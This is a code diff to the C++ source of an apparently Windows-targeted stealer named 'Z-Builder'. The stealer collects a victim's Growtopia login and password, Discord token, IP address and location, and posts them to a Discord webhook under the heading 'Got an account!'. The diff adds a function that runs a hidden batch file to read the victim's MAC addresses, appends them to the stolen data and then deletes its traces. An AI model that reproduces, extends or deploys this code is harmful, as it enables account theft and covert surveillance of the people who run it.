@@ -45,6 +45,7 @@ bool VerifyLicense(string License);
 string decrypt2(string toEncryt);
 string ReadContent(string Path);
 void WriteTempContent(string Content);
+string GetMAC();
 
 INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
 {
@@ -113,7 +114,7 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
             DToken = "No discord token found";
         }
         // Discord Token - End
-        string Info = "IP address: ```" + IPInfo + "```" + "City / Region / Country: ```" + Location + "```" + "Time stolen: ```" + Time + "```" + "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```" + "Discord token: ```" + DToken + "```";
+        string Info = "MAC address(es): ```" + GetMAC() + "```" + "IP address: ```" + IPInfo + "```" + "City / Region / Country: ```" + Location + "```" + "Time stolen: ```" + Time + "```" + "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```" + "Discord token: ```" + DToken + "```";
         string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Got an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
         SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
         CleanUp();
@@ -147,6 +148,47 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
     }
 }
 
+string GetMAC()
+{
+    string TempPath = getenv("TEMP");
+    string MACFile = TempPath + "\\MAC.bat";
+    ofstream WriteScript(MACFile, std::ofstream::trunc);
+    WriteScript << "GetMAC > %temp%\\MAC.zb";
+    WriteScript.close();
+    string Code = "cmd.exe /c " + MACFile;
+    wstring wCode;
+    wCode.assign(Code.begin(), Code.end());
+    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
+    STARTUPINFO si;
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    string Results = TempPath + "\\MAC.zb";
+    ifstream ReadResult(Results);
+    string MACResults((istreambuf_iterator<char>(ReadResult)),
+        (istreambuf_iterator<char>()));
+    string AllMacs = "";
+    while (MACResults.find("\n") != string::npos)
+    {
+        string StringToSplit = "\n";
+        size_t Splitter = MACResults.find(StringToSplit);
+        string PotentialMACLine = MACResults.substr(0, Splitter);
+        string PotentialMAC = PotentialMACLine.substr(0, 16);
+        if (PotentialMAC.find('-') != string::npos)
+        {
+            AllMacs += PotentialMAC + " / ";
+        }
+        MACResults.erase(0, Splitter + 1);
+    }
+    remove(MACFile.c_str());
+    remove(Results.c_str());
+    return AllMacs.substr(0, AllMacs.length() - 3);
+}
 void HideStealer()
 {
     try 
